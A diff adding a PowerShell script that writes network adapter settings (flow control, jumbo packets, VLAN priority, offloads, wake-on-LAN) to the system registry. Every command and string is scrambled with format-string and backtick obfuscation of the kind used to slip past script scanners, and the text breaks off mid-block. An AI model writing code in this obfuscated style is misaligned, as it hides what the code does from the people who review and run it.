@@ -1,0 +1,501 @@
+[CmdletBinding()]
+param
+(
+		[string]${coN`SoLET`iTLe} = ("{1}{4}{3}{5}{2}{0}"-f'es','N',' Properti',' Adv','IC','anced'),
+		[ValidateSet('Off', 'On')][string]${E`NErGYEFF`ici`eNTETHe`RNET},
+		[ValidateSet({"{0}{2}{1}" -f'Di','ed','sabl'}, {"{1}{2}{3}{0}"-f 'ed','Tx',' Enab','l'}, {"{0}{1}{2}" -f'Rx E','n','abled'}, {"{4}{1}{3}{0}{2}"-f 'l',' & T','ed','x Enab','Rx'})][string]${FloWco`N`Tr`oL},
+		[ValidateSet({"{1}{0}{2}"-f'isab','D','led'}, {"{1}{0}{2}" -f '88 By','40','tes'}, {"{3}{1}{2}{0}" -f 'tes',' ','By','9014'})][string]${Jum`BO`pAC`KET},
+		[ValidateSet({"{0}{1}{2}"-f 'D','isable','d'}, {"{1}{0}"-f 'led','Enab'})][string]${lEgaCyswIt`chcOMp`ATiBil`ItY`MOde},
+		[ValidateSet({"{0}{1}"-f'Disa','bled'}, {"{0}{2}{1}"-f 'E','ed','nabl'})][string]${lInks`PEeDBATterY`s`A`VeR},
+		[ValidateSet({"{2}{6}{4}{5}{1}{3}{0}"-f'd','AN Dis','Priority','able','& ','VL',' '}, {"{2}{4}{3}{1}{0}"-f 'd','Enable','Priori',' ','ty'}, {"{2}{0}{1}{3}" -f'a','ble','VLAN En','d'}, {"{2}{1}{4}{3}{5}{0}"-f 'ed','rit','Prio','VLAN','y & ',' Enabl'})][string]${PRIo`RiT`YV`LaN},
+		[ValidateSet({"{1}{0}{2}"-f'a','Dis','bled'}, {"{0}{1}"-f'En','abled'})][string]${pRO`TOCo`L`A`R`pOFFLoad},
+		[ValidateSet({"{0}{1}{2}"-f'Di','sable','d'}, {"{1}{0}{2}"-f 'e','Enabl','d'})][string]${p`RoToC`OlN`SOf`FLo`AD},
+		[ValidateSet({"{4}{0}{3}{1}{2}" -f 'o','i','ation',' Negot','Aut'}, {"{5}{4}{2}{1}{3}{0}"-f'x','ps Half D','b','uple','0 M','1'}, {"{0}{1}{4}{3}{5}{2}" -f'10 ','Mb','ex','ull ','ps F','Dupl'}, {"{1}{5}{0}{3}{4}{2}" -f'H','100 ','plex','alf ','Du','Mbps '}, {"{4}{2}{1}{3}{0}"-f'uplex','ul','00 Mbps F','l D','1'}, {"{4}{2}{1}{5}{3}{0}"-f 'plex','ll','bps Fu','Du','1.0 G',' '})][string]${s`PeeDDU`pl`eX},
+		[ValidateSet({"{1}{0}" -f'led','Disab'}, {"{0}{1}{2}" -f 'En','ab','led'})][string]${sy`StE`MIdlEPO`Wer`SaVer},
+		[ValidateSet({"{1}{0}"-f 'abled','Dis'}, {"{0}{1}{2}" -f'E','nabl','ed'})][string]${WAkEO`Nm`AG`iCPA`CKEt},
+		[ValidateSet({"{0}{1}"-f'Disable','d'}, {"{1}{0}{2}" -f'l','Enab','ed'})][string]${wAKeOnp`ATTe`R`Nm`ATCH}
+)
+
+function GET-PhY`si`Cal`NIcs {
+
+	
+	[CmdletBinding()]
+	param ()
+	
+	
+	${N`iCs} = &("{0}{2}{1}"-f 'Get-','miObject','W') ("{3}{2}{4}{1}{0}{5}" -f'dap','rkA','n32_','Wi','Netwo','ter') -filter ('Adapt'+'e'+'rTyp'+'eID '+'= '+('{0}0{'+'0'+'} ')-f  [CHar]39+"`
+	AND "+'Phys'+'ica'+'lAdapt'+'er'+' '+'= '+('{0}tru'+'e'+'{0} ')-F  [cHAR]39+"`
+	AND "+'N'+'OT '+'Des'+'cript'+'ion'+' '+'LI'+'KE '+('M'+'vX%Cen'+'trino%'+'MvX'+' ')."REPLA`ce"(([ChAR]77+[ChAR]118+[ChAR]88),[string][ChAR]39)+"`
+	AND "+'N'+'OT '+'De'+'scriptio'+'n '+'LIKE'+' '+('{0}%w'+'i'+'r'+'ele'+'ss%'+'{0} ')  -f [ChAR]39+"`
+	AND "+'NOT'+' '+'De'+'s'+'cription '+'LIKE'+' '+('{0}%v'+'i'+'r'+'tual%{'+'0} ')-F  [chAR]39+"`
+	AND "+'N'+'OT '+'Descr'+'i'+'pt'+'ion '+'LIKE'+' '+('WE8%WiF'+'i'+'%WE8'+' ')."R`EplACe"('WE8',[sTring][chAR]39)+"`
+	AND "+'NOT'+' '+'D'+'e'+'scrip'+'tion '+'LIKE'+' '+('{'+'0}%Blu'+'etoot'+'h'+'%{'+'0}')-f [cHaR]39)
+	Return ${Ni`Cs}
+}
+
+function G`eT-Pl`AtforM {
+
+	
+	[CmdletBinding()][OutputType([string])]
+	param ()
+	
+	if (&("{0}{1}{3}{2}"-f 'Get-W','m','t','iObjec') -Class ("{2}{0}{1}"-f'batt','ery','win32_') -ComputerName ("{0}{1}{2}" -f 'loca','l','host')) {
+		${P`L`A`TfORM} = ("{2}{1}{0}"-f'op','pt','La')
+	} else {
+		${PlAt`F`Orm} = ("{2}{1}{0}"-f'op','eskt','D')
+	}
+	Return ${pLA`T`F`ORM}
+}
+
+function S`E`T`-NiCReGIStry`K`ey {
+
+	
+	[CmdletBinding()]
+	param
+	(
+			${neTw`orK`AdapTerS}
+	)
+	
+	${NEtW`Or`KADa`PT`eRkey} = "HKLM:\system\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
+	foreach (${net`W`O`Rk`ADaPTeR} in ${Net`W`oRka`Dapte`Rs}) {
+		If ([int]${N`etW`ORkAda`p`TeR}."devI`Ce`id" -lt 10) {
+			${neTwo`Rk`ADAPtersu`BKEy} = ${NET`wORkA`daPT`E`Rkey} + "\" + "000" + ${nETw`ORkadaPt`eR}."dEvI`CE`iD"
+		} else {
+			${netwO`R`ka`D`AptER`SuBKEy} = ${NE`Tw`o`RkaDAPter`KEy} + "\" + "00" + ${ne`TWor`k`ADaP`TEr}."D`EvIceiD"
+		}
+		${aDapTe`Rp`RO`PER`TIES} = &("{0}{4}{3}{2}{1}"-f 'Ge','ty','roper','emP','t-It') ${nE`T`WoR`k`AdA`PteRs`UBKEy}
+		
+		If (${EnergYEFf`iC`iEnTEt`H`er`NET} -ne "") {
+			${AD`AP`ToR`PRoperTY} = ("{3}{2}{0}{4}{1}"-f 'rtisem','t','dve','EEELinkA','en')
+			&("{1}{0}{2}" -f 'e-Ho','Writ','st') ("{1}{2}{3}{5}{4}{0}{6}" -f 'hernet.','E','n','ergy Effi',' Et','cient','....') -NoNewline
+			If (${EN`E`RGyEFFIcIENt`Et`HErneT} -eq "On") {
+				${v`AL`UE} = &("{0}{1}{3}{2}"-f 'Get-','It','mProperty','e') -Path ${netWorKa`daP`T`E`RsUBkEy} -Name ${A`DA`pTorP`RO`PeRTY}
+				&("{2}{3}{0}{1}"-f'per','ty','Set-Ite','mPro') -Path ${N`etwORka`DapTe`RSUB`k`ey} -Name ${aDA`p`TOr`pRopE`Rty} -Value 1
+				${vaL`UE} = &("{1}{3}{0}{2}" -f 't-ItemP','G','roperty','e') -Path ${N`Etw`oRKaD`APT`ersu`BKEy} -Name ${ADap`ToRpr`OpER`TY}
+				If (${v`AL`Ue}.${aDAPT`o`Rp`ROPER`TY} -eq 1) {
+					&("{3}{1}{2}{0}" -f 'Host','it','e-','Wr') ${e`NER`GYeFFiC`I`eN`TETH`ErNeT} -ForegroundColor ("{1}{0}"-f 'low','Yel')
+				} else {
+					&("{0}{3}{2}{1}"-f 'W','t','-Hos','rite') ("{1}{0}" -f'd','Faile') -ForegroundColor ("{1}{0}"-f'ed','R')
+				}
+			} else {
+				${v`A`LUe} = &("{4}{0}{3}{1}{2}"-f 't-ItemPr','ert','y','op','Ge') -Path ${N`ETW`oRk`ADA`pTERSu`BKeY} -Name ${A`DaPTORpr`oP`erTy}
+				&("{0}{4}{3}{1}{2}" -f'Set-ItemPr','r','ty','pe','o') -Path ${NeTWO`R`K`ADa`pter`sUbK`Ey} -Name ${a`daPTOrP`RoPerty} -Value 0
+				${V`A`lue} = &("{3}{2}{1}{0}{4}"-f'er','Prop','tem','Get-I','ty') -Path ${n`e`T`woRkAdaptE`R`sub`kEY} -Name ${aDa`ptoRPrO`PE`Rty}
+				If (${vA`luE}.${adAPt`oRpRop`Er`Ty} -eq 0) {
+					&("{1}{0}{2}" -f'-Hos','Write','t') ${eNeRGYef`FICI`e`N`T`ETH`eRn`Et} -ForegroundColor ("{0}{1}"-f'Ye','llow')
+				} else {
+					&("{1}{2}{0}"-f 't','Write-','Hos') ("{1}{0}" -f'ed','Fail') -ForegroundColor ("{0}{1}" -f'R','ed')
+				}
+			}
+		}
+		
+		If (${F`LoW`Co`NtrOl} -ne "") {
+			${AdAp`TORpRoper`TY} = ("{0}{1}{2}" -f'*Flo','wContr','ol')
+			&("{0}{2}{1}"-f'W','t','rite-Hos') ("{2}{1}{0}{3}{4}"-f 'rol','w Cont','Flo','.','....') -NoNewline
+			switch (${FLOWCO`NT`ROL}) {
+				("{0}{2}{1}" -f 'Di','ed','sabl') {
+					${adaP`TERPr`OPE`RTyValuE} = 0
+					${VA`LUe} = &("{4}{0}{3}{1}{2}" -f 'et-ItemPr','pert','y','o','G') -Path ${nE`TwoRkA`da`pTersUBkeY} -Name ${aDap`TORP`RoP`erTy}
+					&("{0}{2}{1}"-f 'S','Property','et-Item') -Path ${Ne`TWOrk`ADA`PTe`RS`Ub`KEY} -Name ${A`DA`P`TOrpr`operTy} -Value ${A`Dapt`eR`propEr`Ty`VALUE}
+					${v`A`lUe} = &("{1}{3}{2}{0}"-f 'ItemProperty','Ge','-','t') -Path ${n`e`TWOR`KAdAP`TErsUBkEy} -Name ${adaptoR`Pro`P`E`RtY}
+					If (${Va`lUe}.${a`DaptoRPrOp`E`RTY} -eq ${a`daPTER`pRoPeRtyVAl`Ue}) {
+						&("{2}{0}{1}" -f'i','te-Host','Wr') ${FlOWcoNT`R`Ol} -ForegroundColor ("{1}{0}"-f'w','Yello')
+					} else {
+						&("{0}{2}{1}" -f 'Write','t','-Hos') ("{2}{0}{1}" -f 'aile','d','F') -ForegroundColor ("{0}{1}" -f 'Re','d')
+					}
+				}
+				("{0}{1}{2}" -f 'Tx Ena','bl','ed') {
+					${ADAPTEr`propE`Rt`yvAl`UE} = 1
+					${VA`LUE} = &("{3}{2}{4}{1}{0}"-f'Property','m','t-','Ge','Ite') -Path ${NEtwOr`kADa`p`Te`R`S`UBKEY} -Name ${Adap`Tor`Pr`Op`ER`TY}
+					&("{0}{1}{4}{3}{2}" -f'Set-Ite','m','operty','r','P') -Path ${n`eTwoRKadaP`T`eRs`Ub`KeY} -Name ${adAP`TOrP`RoP`er`TY} -Value ${aDa`P`TER`pROpErTy`VAlue}
+					${Val`UE} = &("{3}{4}{0}{2}{1}" -f 'op','y','ert','Get-I','temPr') -Path ${neTwORk`A`d`APte`RsuBKey} -Name ${aDap`T`ORPRoP`eR`TY}
+					If (${VA`luE}.${a`Dap`TORpRo`PerTY} -eq ${aDa`pter`propEr`Tyva`Lue}) {
+						&("{0}{1}{2}"-f 'Write','-','Host') ${fLO`WCO`NtR`Ol} -ForegroundColor ("{0}{1}" -f'Y','ellow')
+					} else {
+						&("{2}{1}{0}{3}"-f 'te-Ho','ri','W','st') ("{1}{0}"-f'ailed','F') -ForegroundColor ("{1}{0}" -f 'd','Re')
+					}
+				}
+				("{2}{1}{3}{0}" -f 'abled','x','R',' En') {
+					${aDAp`TEr`pROPerTYva`Lue} = 2
+					${Va`L`Ue} = &("{0}{1}{2}"-f 'Get','-ItemP','roperty') -Path ${NET`W`oRKadA`P`TErSuBKEy} -Name ${AdaptOr`P`Ro`PE`RtY}
+					&("{1}{3}{2}{0}" -f 'operty','Set-','temPr','I') -Path ${n`eTWoR`kA`Da`PterSUbk`eY} -Name ${Ad`ApTOrp`Rop`e`RTY} -Value ${a`DApT`eRPrOpeRty`V`Al`Ue}
+					${v`AlUE} = &("{1}{0}{2}{3}" -f 'P','Get-Item','ro','perty') -Path ${NeT`W`orkaD`Ap`TerSu`Bkey} -Name ${AdA`P`TOrPrOp`ERtY}
+					If (${V`AlUE}.${a`DA`pTorp`ROpErtY} -eq ${AdApTErp`RoP`erT`Y`V`ALue}) {
+						&("{2}{1}{3}{0}" -f 't','rite-H','W','os') ${flo`w`cONtROL} -ForegroundColor ("{0}{1}"-f'Yell','ow')
+					} else {
+						&("{2}{1}{0}"-f'st','o','Write-H') ("{1}{0}"-f 'iled','Fa') -ForegroundColor ("{0}{1}"-f 'Re','d')
+					}
+				}
+				("{2}{0}{3}{1}"-f 'E','bled','Rx & Tx ','na') {
+					${AdAPtE`RProp`eRTy`Va`LUe} = 3
+					${vAl`UE} = &("{3}{0}{4}{1}{2}"-f'emP','oper','ty','Get-It','r') -Path ${n`EtwoRK`Ad`APt`eRsUBkEy} -Name ${Ad`A`pTo`RpR`OPerTy}
+					&("{0}{3}{1}{2}" -f'Set-Item','r','operty','P') -Path ${nETWoRKAd`A`pTe`RSUb`keY} -Name ${aDaptorp`RO`peR`TY} -Value ${ad`APTErpro`pE`R`TYVAlUE}
+					${v`A`luE} = &("{2}{1}{4}{3}{0}" -f'y','mProp','Get-Ite','t','er') -Path ${nEtwo`RkAD`APTe`Rsu`Bkey} -Name ${AdaPtOR`P`ROPERTy}
+					If (${Va`LUE}.${ada`pT`oRproPER`Ty} -eq ${adapt`ERP`Rop`Ert`Y`V`ALUE}) {
+						&("{1}{0}{2}" -f 'ri','W','te-Host') ${FLOW`CO`NTroL} -ForegroundColor ("{0}{1}" -f 'Yell','ow')
+					} else {
+						&("{0}{2}{1}{3}"-f 'W','ite-H','r','ost') ("{1}{0}"-f'iled','Fa') -ForegroundColor ("{0}{1}" -f'R','ed')
+					}
+				}
+			}
+		}
+		
+		If (${Ju`mbO`paCkeT} -ne "") {
+			${A`d`ApT`oRPRO`PeRtY} = ("{0}{2}{1}{3}"-f'*','oP','Jumb','acket')
+			&("{1}{0}{2}{3}" -f'it','Wr','e-','Host') ("{0}{1}{3}{2}"-f 'J','umbo Pack','....','et.') -NoNewline
+			switch (${jUm`BO`p`AcKet}) {
+				("{2}{1}{0}"-f 'ed','abl','Dis') {
+					${A`d`Ap`T`erPro`P`eRTyvaLUe} = 1514
+					${V`A`LUE} = &("{0}{1}{3}{2}" -f 'Get','-Item','rty','Prope') -Path ${N`etWORkAD`A`pteRS`U`Bkey} -Name ${a`dA`ptOrprOpE`R`Ty}
+					&("{2}{0}{3}{1}"-f'et-Ite','y','S','mPropert') -Path ${Ne`TworKAD`ApTERsu`BKEy} -Name ${ADApTO`R`PR`Op`ERTY} -Value ${ada`pteRpr`O`Pe`RTYVAL`Ue}
+					${VAL`UE} = &("{0}{2}{3}{4}{1}" -f 'Get','ty','-','ItemP','roper') -Path ${neTwor`K`AD`APteR`sUbkeY} -Name ${aDa`pTO`Rpro`pe`RTY}
+					If (${VAl`Ue}.${aDA`Pt`OrProP`ER`TY} -eq ${ADapTeRp`RO`pe`R`TYVAluE}) {
+						&("{1}{0}{2}{3}"-f'ite','Wr','-Ho','st') ${jUm`BO`pac`KeT} -ForegroundColor ("{0}{1}"-f 'Yel','low')
+					} else {
+						&("{0}{1}{2}"-f'Writ','e-H','ost') ("{2}{0}{1}"-f 'l','ed','Fai') -ForegroundColor ("{0}{1}" -f'Re','d')
+					}
+				}
+				("{0}{2}{1}" -f'4088 ','tes','By') {
+					${ADaP`TE`RpROP`eRtYValUe} = 4088
+					${VA`lUe} = &("{2}{3}{0}{1}"-f 'ro','perty','Get-It','emP') -Path ${n`e`TwORkaDap`TE`RS`UBkEY} -Name ${a`DAp`ToRpRo`p`erty}
+					&("{4}{1}{0}{2}{3}"-f'-ItemPr','et','ope','rty','S') -Path ${n`e`TWORKAd`Ap`T`eRS`UbkeY} -Name ${AdAp`Tor`Pr`OP`ErTy} -Value ${AD`Ap`TERp`Rop`eRTYvalUE}
+					${vA`LuE} = &("{0}{2}{1}"-f'Get-ItemP','operty','r') -Path ${n`E`TwoRkADApte`RS`U`BkeY} -Name ${AdapT`Or`PrOPe`R`Ty}
+					If (${VA`l`Ue}.${AdAP`ToR`Pro`peRty} -eq ${aDApterpRoPe`R`Tyv`AL`UE}) {
+						&("{1}{2}{0}" -f'ost','Wr','ite-H') ${JUmb`OP`Ac`KET} -ForegroundColor ("{0}{1}" -f'Yel','low')
+					} else {
+						&("{2}{0}{1}{3}"-f 't','e-Ho','Wri','st') ("{1}{0}" -f 'ed','Fail') -ForegroundColor ("{1}{0}" -f'ed','R')
+					}
+				}
+				("{1}{2}{0}" -f'tes','9','014 By') {
+					${aDapt`ErPrOp`eRTy`VAL`UE} = 9014
+					${vAl`UE} = &("{4}{2}{1}{0}{3}" -f'ropert','mP','t-Ite','y','Ge') -Path ${ne`TWoR`KaDapTEr`s`UbKEY} -Name ${aDa`P`To`Rp`RoPERty}
+					&("{1}{0}{2}{3}"-f'et-ItemPr','S','ope','rty') -Path ${netWo`RKA`Dapt`e`RsUBKeY} -Name ${aDAPTo`RP`RO`pe`RTy} -Value ${ADApter`pROp`Er`T`Y`VAL`Ue}
+					${V`AlUe} = &("{4}{0}{2}{1}{3}" -f'Ite','p','mPro','erty','Get-') -Path ${nETWORKAdA`p`T`E`RSub`kEy} -Name ${a`da`P`TORPropeRty}
+					If (${V`AlUE}.${a`D`ApTO`RP`Roperty} -eq ${aDaPT`E`RProPe`RT`YVAl`UE}) {
+						&("{1}{2}{0}"-f 'ite-Host','W','r') ${JUmBo`P`ACK`Et} -ForegroundColor ("{1}{0}" -f 'ellow','Y')
+					} else {
+						&("{2}{0}{1}"-f'te-H','ost','Wri') ("{0}{1}"-f 'Faile','d') -ForegroundColor ("{1}{0}" -f'd','Re')
+					}
+				}
+			}
+		}
+		
+		If (${l`E`G`AcySwItC`H`cOmp`AtIBI`LIt`yMOdE} -ne "") {
+			${AdApt`ORp`Rope`RtY} = ("{0}{1}{3}{2}{4}"-f 'L','inkNegotiat','onPro','i','cess')
+			&("{0}{1}{2}"-f 'Wri','t','e-Host') ("{4}{2}{6}{7}{0}{3}{1}{5}"-f'i','y Mod','y S','t','Legac','e.....','witch Compa','tibil') -NoNewline
+			If (${LEgAc`Ysw`iTcHCoMPA`TiBi`L`Ity`mODE} -eq ("{1}{2}{0}" -f'd','D','isable')) {
+				${v`AlUE} = &("{3}{0}{2}{1}{4}" -f'et','ItemProp','-','G','erty') -Path ${Netw`oRKaDA`pTe`Rs`U`BkEY} -Name ${aDAPtoRp`R`oPERtY}
+				&("{3}{2}{0}{1}" -f'mPro','perty','-Ite','Set') -Path ${n`etwoRka`dAP`TeRSUb`keY} -Name ${A`DAPTor`prO`PE`Rty} -Value 1
+				${v`Alue} = &("{3}{1}{2}{0}" -f 'roperty','et-I','temP','G') -Path ${N`ETw`o`RkaDApTer`Sub`KEy} -Name ${aDA`P`TOrPR`oP`Erty}
+				If (${v`A`luE}.${aDA`pTO`R`proPE`RTy} -eq 1) {
+					&("{0}{2}{3}{1}" -f'Writ','ost','e','-H') ${le`G`AC`ySWi`TC`hco`MP`At`ibIliTYmoDe} -ForegroundColor ("{0}{1}"-f'Yel','low')
+				} else {
+					&("{3}{2}{1}{0}"-f'st','o','-H','Write') ("{1}{0}" -f'ed','Fail') -ForegroundColor ("{0}{1}"-f'Re','d')
+				}
+			} else {
+				${vAl`Ue} = &("{1}{0}{3}{2}"-f 'temP','Get-I','operty','r') -Path ${NeT`wO`RkaD`A`PTE`RsUbKeY} -Name ${A`D`Apt`ORprOpE`R`Ty}
+				&("{0}{2}{1}{3}{4}" -f'S','I','et-','temP','roperty') -Path ${N`ETW`or`kA`d`APTERsUBKEy} -Name ${A`dAPtORpr`opE`R`Ty} -Value 2
+				${V`AlUe} = &("{0}{2}{1}{3}" -f'Get-Ite','roper','mP','ty') -Path ${netw`or`kADAp`T`ERSuBkeY} -Name ${aDaP`T`orp`RoPErTy}
+				If (${v`A`lUe}.${Ada`Pto`RpR`OpeRtY} -eq 2) {
+					&("{2}{0}{1}"-f 'ite-Hos','t','Wr') ${LEg`ACYSWitch`c`OmPatI`BiLiTymo`DE} -ForegroundColor ("{0}{1}" -f 'Yello','w')
+				} else {
+					&("{0}{1}{2}" -f 'W','r','ite-Host') ("{1}{2}{0}" -f'd','Fa','ile') -ForegroundColor ("{1}{0}" -f 'ed','R')
+				}
+			}
+		}
+		
+		If (${linkS`pEeDb`Atter`YSAV`Er} -ne "") {
+			${p`LA`TFOrm} = &("{3}{0}{1}{2}" -f't-Pl','a','tform','Ge')
+			If (${p`LatfO`Rm} -eq ("{2}{1}{0}" -f'top','ap','L')) {
+				${aDAPto`RProp`e`RTY} = ("{2}{4}{3}{1}{0}"-f 'bled','eEna','Au','veMod','toPowerSa')
+				&("{2}{0}{1}"-f 'ite-H','ost','Wr') ("{2}{1}{4}{3}{0}{5}"-f 'Battery Saver..','i','L','peed ','nk S','...') -NoNewline
+				If (${liNkspEe`dBa`TTe`RY`S`A`Ver} -eq ("{1}{2}{0}" -f 'ed','Di','sabl')) {
+					${V`A`lUE} = &("{4}{3}{2}{1}{0}"-f'y','t','ItemProper','t-','Ge') -Path ${NeTwOrKa`DA`PtEr`SUB`kEY} -Name ${ad`ApTor`pR`opeRTy}
+					&("{3}{4}{1}{0}{2}"-f 'mPrope','te','rty','Set','-I') -Path ${n`etWO`RkAD`APtErSubKeY} -Name ${adaPtoR`Pro`P`E`RTy} -Value 0
+					${V`A`lue} = &("{0}{3}{2}{1}" -f'Get','roperty','P','-Item') -Path ${NEt`WorkadAP`T`ErsUbKEy} -Name ${aDa`pTo`RproPERTy}
+					If (${v`AluE}.${aDAp`TORPRo`per`TY} -eq 0) {
+						&("{0}{2}{1}" -f'W','ite-Host','r') ${L`inkS`Pe`EdbATteRyS`A`VER} -ForegroundColor ("{1}{0}"-f 'ellow','Y')
+					} else {
+						&("{1}{3}{2}{0}"-f'ost','Writ','-H','e') ("{1}{0}{2}" -f 'e','Fail','d') -ForegroundColor ("{0}{1}" -f'R','ed')
+					}
+				} else {
+					${V`A`LUe} = &("{2}{0}{1}" -f 'mP','roperty','Get-Ite') -Path ${nEtW`o`RKA`D`A`pteRsubKey} -Name ${ADa`pto`RPrOp`erTY}
+					&("{4}{2}{0}{3}{1}"-f 'Ite','erty','et-','mProp','S') -Path ${ne`TworkAd`A`p`TErSUBk`eY} -Name ${Ada`p`TOrpRop`E`RTy} -Value 1
+					${vaL`Ue} = &("{0}{3}{2}{1}"-f'Get-I','erty','op','temPr') -Path ${Ne`TwOrKad`A`ptErs`UbKeY} -Name ${A`dApT`ORPRoPe`RTy}
+					If (${VAl`UE}.${aDaptor`pR`O`pertY} -eq 1) {
+						&("{1}{0}{2}"-f'e-','Writ','Host') ${lInKsPeEDb`Atter`YSA`VER} -ForegroundColor ("{2}{1}{0}"-f'low','el','Y')
+					} else {
+						&("{1}{2}{0}" -f'-Host','W','rite') ("{1}{2}{0}"-f 'ed','Fa','il') -ForegroundColor ("{1}{0}"-f 'd','Re')
+					}
+				}
+			}
+		}
+		
+		If (${pR`io`RityvLan} -ne "") {
+			${AD`A`p`T`oRPrOpERtY} = ("{2}{3}{4}{1}{0}"-f'yVLANTag','t','*P','ri','ori')
+			&("{1}{3}{2}{0}" -f'-Host','W','te','ri') ("{3}{0}{2}{1}" -f 'riorit','....','y VLAN.','P') -NoNewline
+			switch (${pRiO`Rit`Y`Vlan}) {
+				("{6}{0}{5}{4}{7}{2}{3}{1}" -f'y','sabled','LAN',' Di',' ',' &','Priorit','V') {
+					${adApTe`RpRop`e`RT`YVaLUE} = 0
+					${vA`l`UE} = &("{1}{2}{3}{0}{4}"-f 'rt','Get-Item','Pr','ope','y') -Path ${Ne`TwOrKA`D`APteRSuB`Key} -Name ${ad`APtORPro`p`erTy}
+					&("{2}{0}{3}{1}" -f't-ItemProp','rty','Se','e') -Path ${NEtWO`RkA`d`A`pTERs`UbKEY} -Name ${AdAptOR`pR`OPe`RTY} -Value ${Adap`TerPROPe`RtY`V`A`lUE}
+					${v`Alue} = &("{3}{1}{4}{2}{0}" -f 'roperty','-It','mP','Get','e') -Path ${neT`WOrkaDA`P`TER`sUbK`eY} -Name ${A`daPToR`pR`OPErTY}
+					If (${Va`lUe}.${ADAp`ToR`prO`P`ERTy} -eq ${aD`APT`erP`RopeRTyVAlUE}) {
+						&("{2}{0}{1}" -f'-Ho','st','Write') ${PriorITy`Vl`AN} -ForegroundColor ("{2}{0}{1}" -f 'llo','w','Ye')
+					} else {
+						&("{0}{1}{2}" -f'Writ','e-Ho','st') ("{0}{1}{2}" -f 'Fa','ile','d') -ForegroundColor ("{1}{0}"-f'ed','R')
+					}
+				}
+				("{1}{2}{4}{0}{3}"-f 'able','Prior','ity','d',' En') {
+					${a`dap`T`erprOP`e`Rt`yVALUe} = 1
+					${v`Al`UE} = &("{0}{1}{3}{2}{4}"-f'Get','-ItemP','oper','r','ty') -Path ${nETWoRKADAPTE`R`s`Ub`kEy} -Name ${A`dAptoR`P`ROp`ERtY}
+					&("{3}{1}{0}{2}{4}"-f'em','It','Pr','Set-','operty') -Path ${N`EtWo`RK`AdaP`TER`suBkEy} -Name ${adaPt`o`R`pr`OPERty} -Value ${ada`PTE`RPROpERtyva`LUE}
+					${Val`UE} = &("{1}{0}{3}{2}{4}{5}"-f 't-','Ge','oper','ItemPr','t','y') -Path ${n`etW`oRkAdAPTERsU`BK`eY} -Name ${Ad`Apt`oRP`ROpERTy}
+					If (${v`A`lUE}.${ADA`pTo`R`pR`op`ErTy} -eq ${AdA`PTerpR`OPERT`Yv`Alue}) {
+						&("{3}{1}{0}{2}"-f'e-','rit','Host','W') ${Pri`O`Rit`YVLAn} -ForegroundColor ("{1}{0}" -f 'w','Yello')
+					} else {
+						&("{3}{0}{1}{2}" -f 'te-H','os','t','Wri') ("{2}{0}{1}" -f 'e','d','Fail') -ForegroundColor ("{0}{1}" -f'R','ed')
+					}
+				}
+				("{3}{2}{1}{0}" -f 'nabled','N E','A','VL') {
+					${ADapTERProp`E`Rt`YVALUE} = 2
+					${V`AlUE} = &("{3}{2}{4}{0}{1}" -f'rope','rty','et-It','G','emP') -Path ${n`e`T`worKaD`ApT`ErSub`Key} -Name ${A`daPT`o`RPr`op`erTY}
+					&("{1}{0}{2}{4}{3}" -f 't','Se','-Item','ty','Proper') -Path ${NE`T`WoRKadAPte`RSUbk`EY} -Name ${A`dA`P`TOrp`RoPERtY} -Value ${AdAPTe`RP`RoPeRTy`Va`lUe}
+					${v`AL`Ue} = &("{4}{3}{0}{2}{1}"-f 'm','y','Propert','t-Ite','Ge') -Path ${nETW`ORkAd`A`ptErs`UBKey} -Name ${A`da`P`TOr`PropERty}
+					If (${VaL`Ue}.${a`D`AP`TOrPRopEr`Ty} -eq ${a`DApte`R`Pr`OPERTyVal`UE}) {
+						&("{1}{0}{2}" -f'H','Write-','ost') ${PRIorItY`V`LAN} -ForegroundColor ("{0}{1}"-f 'Yello','w')
+					} else {
+						&("{2}{1}{0}" -f 't','Hos','Write-') ("{1}{2}{0}"-f 'led','Fa','i') -ForegroundColor ("{0}{1}"-f 'R','ed')
+					}
+				}
+				("{1}{4}{2}{3}{0}" -f'ed','Prior','& VLAN Ena','bl','ity ') {
+					${a`d`ApT`ErpROPERt`Y`ValUE} = 3
+					${Val`UE} = &("{4}{2}{3}{1}{0}"-f'ty','er','mP','rop','Get-Ite') -Path ${NETwo`RkAdAp`T`e`Rs`UbKeY} -Name ${Ad`A`pToRpr`oPEr`TY}
+					&("{3}{4}{1}{0}{2}" -f 'er','temProp','ty','Set-','I') -Path ${nEtWoRK`A`D`APt`eR`SUBkEy} -Name ${ada`PT`ORpro`pertY} -Value ${aD`APtER`PRop`ERTy`VAlue}
+					${v`A`LuE} = &("{2}{0}{3}{1}" -f't-Ite','rty','Ge','mPrope') -Path ${NETwo`R`kAdaP`TER`su`BkeY} -Name ${ADaPT`o`RP`R`OPERTy}
+					If (${VaL`UE}.${ADAp`TOR`Pr`oP`ErtY} -eq ${Adapt`er`PROPErt`Y`V`Al`UE}) {
+						&("{0}{1}{2}{3}" -f'Wri','te','-Hos','t') ${prIOri`T`Y`Vl`AN} -ForegroundColor ("{0}{1}" -f 'Yello','w')
+					} else {
+						&("{0}{2}{3}{1}"-f 'W','st','ri','te-Ho') ("{1}{0}{2}"-f'aile','F','d') -ForegroundColor ("{0}{1}" -f 'R','ed')
+					}
+				}
+			}
+		}
+		
+		If (${pROToC`ol`Arp`oFF`lo`AD} -ne "") {
+			${Ad`APtorPRO`P`Er`Ty} = ("{0}{2}{1}{4}{3}"-f '*','R','PMA','fload','POf')
+			&("{2}{0}{1}"-f 'e-','Host','Writ') ("{1}{0}{4}{3}{2}{5}" -f'o','Pr','oad....',' ARP Offl','tocol','.') -NoNewline
+			If (${pRoTOCoL`Ar`Po`FFl`O`Ad} -eq ("{1}{0}{2}"-f 'le','Disab','d')) {
+				${VAl`UE} = &("{4}{1}{3}{0}{2}"-f'rop','t-Ite','erty','mP','Ge') -Path ${NETWoRK`AD`A`ptErS`U`Bk`Ey} -Name ${Ad`A`P`TOrpropErtY}
+				&("{0}{1}{2}{3}"-f 'Set-It','em','Pr','operty') -Path ${NETWoR`KAdap`TersUb`K`Ey} -Name ${A`dapto`RpropE`RTy} -Value 0x00000001
+				${v`AL`Ue} = &("{3}{1}{2}{0}"-f'y','emProper','t','Get-It') -Path ${N`E`TwO`RK`ADaPT`ErSUBkEy} -Name ${ADaPtoRp`RO`P`eRtY}
+				If (${vA`l`Ue}.${A`Da`pto`RpROpErTy} -eq 0x00000001) {
+					&("{1}{0}{2}"-f 'e-Ho','Writ','st') ${Pr`OTO`c`Ol`A`RpOfFlOad} -ForegroundColor ("{1}{0}" -f'ow','Yell')
+				} else {
